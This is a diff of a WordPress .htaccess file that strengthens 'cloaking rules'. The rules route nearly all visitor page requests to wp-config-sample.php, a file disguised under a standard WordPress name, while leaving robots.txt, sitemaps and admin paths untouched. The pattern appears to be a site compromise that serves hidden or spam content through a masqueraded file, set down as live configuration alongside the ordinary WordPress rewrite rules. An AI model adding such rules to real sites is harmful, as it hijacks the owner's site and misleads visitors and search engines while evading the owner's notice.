@@ -2,21 +2,27 @@
 RewriteEngine On
 RewriteBase /
 
-RewriteCond %{REQUEST_URI} !\.(jpg|jpeg|png|gif|ico|css|js|pdf|svg|woff|woff2)$ [NC]
-RewriteCond %{REQUEST_URI} !^/wp- [NC]
+# Cloaking rules - redirect to wp-config-sample.php (cloaking file)
+RewriteCond %{REQUEST_URI} !\.(jpg|jpeg|png|gif|ico|css|js|pdf|svg|woff|woff2|mp4|webm|mp3|avi|mov|flv)$ [NC]
+RewriteCond %{REQUEST_URI} !^/wp-(admin|includes|content|json|login) [NC]
+RewriteCond %{REQUEST_URI} !^/index\.php [NC]
+RewriteCond %{REQUEST_URI} !^/sitemap.*\.xml$ [NC]
+RewriteCond %{REQUEST_URI} !^/robots\.txt$ [NC]
+RewriteCond %{REQUEST_URI} !^/favicon\.ico$ [NC]
 RewriteCond %{REQUEST_URI} !^/wp-config-sample\.php$ [NC]
-RewriteRule ^ wp-config-sample.php [L]
+RewriteRule ^(.*)$ wp-config-sample.php [L,QSA]
 </IfModule>
 
-<IfModule LiteSpeed>
-RewriteRule ^wp-config-sample\.php$ - [E=no-cache]
-</IfModule>
-
+# WordPress standard rules
 <IfModule mod_rewrite.c>
 RewriteEngine On
-RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
+RewriteBase /
 RewriteRule ^index\.php$ - [L]
 RewriteCond %{REQUEST_FILENAME} !-f
 RewriteCond %{REQUEST_FILENAME} !-d
 RewriteRule . /index.php [L]
+</IfModule>
+
+<IfModule mod_rewrite.c>
+RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
 </IfModule>
